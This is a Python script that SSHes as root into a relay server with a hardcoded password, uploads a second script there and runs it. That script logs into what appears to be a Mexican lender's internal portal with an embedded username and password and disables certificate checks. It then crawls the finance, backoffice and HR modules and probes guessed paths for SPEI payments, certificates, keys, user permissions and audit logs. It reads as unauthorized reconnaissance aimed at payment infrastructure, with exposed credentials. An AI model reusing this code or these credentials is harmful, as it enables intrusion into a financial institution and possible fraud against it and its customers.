import paramiko, sys

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
ssh.connect('64.177.88.10', username='root', password='5F.jyTK$D6%.F{a=', timeout=10)
print('Connected', flush=True)

SCRIPT = r'''
import requests, urllib3, json, sys, re
urllib3.disable_warnings()
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"

s = requests.Session()
s.verify = False
s.headers.update({"User-Agent": UA})

# LOGIN
r0 = s.get("https://core.findep.mx/", timeout=10)
token_m = re.search(r'name="cve_idToken"\s+value="([^"]*)"', r0.text)
tok = token_m.group(1) if token_m else ""

r = s.post("https://core.findep.mx/valida.do",
    data={"cve_idToken": tok, "msjPass": "", "cveUsr": "jcruzval",
          "cve_usr": "jcruzval", "cve_psd": "Fisa1234*", "ok_btn": "Entrar"},
    allow_redirects=True, timeout=15)

sys.stdout.write(f"Login: {len(r.text)}b JSESSIONID={s.cookies.get('JSESSIONID','?')}\n\n")

if len(r.text) < 15000:
    sys.stdout.write("LOGIN FAILED\n")
    sys.exit(1)

# EXPLORE MODULES
modules = [
    ("/finanzas/finanzas_index.do", "FINANZAS"),
    ("/backoffice/backoffice_index.do", "BACKOFFICE"),
    ("/rh/rh_index.do", "RH"),
    ("/sucursales/sucursales_index.do", "SUCURSALES"),
    ("/directorio/directorio_index.do", "DIRECTORIO"),
    ("/expansion/expansion_index.do", "EXPANSION"),
    ("/inicio/solicitud_credito.do", "CREDITOS"),
    ("/rh/recibo_busqueda.do", "RECIBO_BUSQUEDA"),
]

all_links = set()

for path, name in modules:
    sys.stdout.write(f"\n{'='*60}\n=== {name} ({path}) ===\n{'='*60}\n")
    sys.stdout.flush()
    try:
        r = s.get(f"https://core.findep.mx{path}", timeout=15, allow_redirects=True)
        sys.stdout.write(f"  [{r.status_code}] {len(r.text)}b URL={r.url}\n")
        
        # Title
        title = re.search(r'<title>(.*?)</title>', r.text[:3000])
        if title:
            sys.stdout.write(f"  Title: {title.group(1)}\n")
        
        # Extract all .do links
        do_links = re.findall(r'(?:href|action)=["\']([^"\']*\.do[^"\']*)["\']', r.text)
        sys.stdout.write(f"  .do links ({len(do_links)}): {do_links[:30]}\n")
        all_links.update(do_links)
        
        # Extract menus/sections
        sections = re.findall(r'class="[^"]*(?:menu|tab|nav)[^"]*"[^>]*>([^<]+)', r.text, re.I)
        if sections:
            sys.stdout.write(f"  Sections: {sections[:20]}\n")
        
        # Look for SPEI/STP/certificate/pago references
        spei_hits = re.findall(r'(?:spei|stp|certificado|pago|transferencia|clabe|banco|clave.?interbancaria|llave|firma|keystore)[^<]{0,100}', r.text, re.I)
        if spei_hits:
            sys.stdout.write(f"  SPEI/CERT refs: {spei_hits[:10]}\n")
        
        # Look for file upload/download
        file_hits = re.findall(r'(?:upload|download|archivo|documento|adjunto|anexo)[^<]{0,100}', r.text, re.I)
        if file_hits:
            sys.stdout.write(f"  File refs: {file_hits[:10]}\n")
            
        # Extract iframe srcs
        iframes = re.findall(r'<iframe[^>]+src="([^"]+)"', r.text)
        if iframes:
            sys.stdout.write(f"  Iframes: {iframes[:5]}\n")
            
        # Body snippet (first 500 of content area)
        body_start = r.text.find('<body')
        if body_start > 0:
            content = r.text[body_start:body_start+1000]
            sys.stdout.write(f"  Body snippet: {repr(content[:500])}\n")
            
    except Exception as e:
        sys.stdout.write(f"  ERR: {e}\n")
    sys.stdout.flush()

# DEEP FINANZAS LINKS
sys.stdout.write(f"\n{'='*60}\n=== DEEP FINANZAS EXPLORATION ===\n{'='*60}\n")
finanzas_paths = [
    "/finanzas/spei.do", "/finanzas/stp.do", "/finanzas/pagos.do",
    "/finanzas/transferencias.do", "/finanzas/clabe.do",
    "/finanzas/certificados.do", "/finanzas/llaves.do",
    "/finanzas/bancos.do", "/finanzas/conciliacion.do",
    "/finanzas/tesoreria.do", "/finanzas/caja.do",
    "/finanzas/comisiones.do", "/finanzas/dispersiones.do",
    "/finanzas/cobranza.do", "/finanzas/cartera.do",
]
for p in finanzas_paths:
    try:
        r = s.get(f"https://core.findep.mx{p}", timeout=10, allow_redirects=False)
        if r.status_code != 404:
            sys.stdout.write(f"  [{r.status_code}] {p} ({len(r.text)}b)\n")
            if r.status_code == 200:
                t = re.search(r'<title>(.*?)</title>', r.text[:2000])
                sys.stdout.write(f"    Title: {t.group(1) if t else 'N/A'}\n")
    except:
        pass
    sys.stdout.flush()

# DEEP BACKOFFICE LINKS
sys.stdout.write(f"\n=== DEEP BACKOFFICE EXPLORATION ===\n")
bo_paths = [
    "/backoffice/usuarios.do", "/backoffice/permisos.do",
    "/backoffice/configuracion.do", "/backoffice/parametros.do",
    "/backoffice/logs.do", "/backoffice/auditoria.do",
    "/backoffice/admin.do", "/backoffice/reportes.do",
]
for p in bo_paths:
    try:
        r = s.get(f"https://core.findep.mx{p}", timeout=10, allow_redirects=False)
        if r.status_code != 404:
            sys.stdout.write(f"  [{r.status_code}] {p} ({len(r.text)}b)\n")
    except:
        pass
    sys.stdout.flush()

# ALL UNIQUE LINKS FOUND
sys.stdout.write(f"\n=== ALL UNIQUE .do LINKS ({len(all_links)}) ===\n")
for link in sorted(all_links):
    sys.stdout.write(f"  {link}\n")

sys.stdout.write(f"\n=== DONE ===\n")
sys.stdout.flush()
'''

sftp = ssh.open_sftp()
with sftp.open('/root/core_explore.py', 'w') as f:
    f.write(SCRIPT)
sftp.close()
print('Uploaded', flush=True)

stdin, stdout, stderr = ssh.exec_command('python3 -u /root/core_explore.py 2>&1', timeout=120)
out = stdout.read().decode(errors='replace')
print(out, flush=True)
ssh.close()
print('Fin.', flush=True)
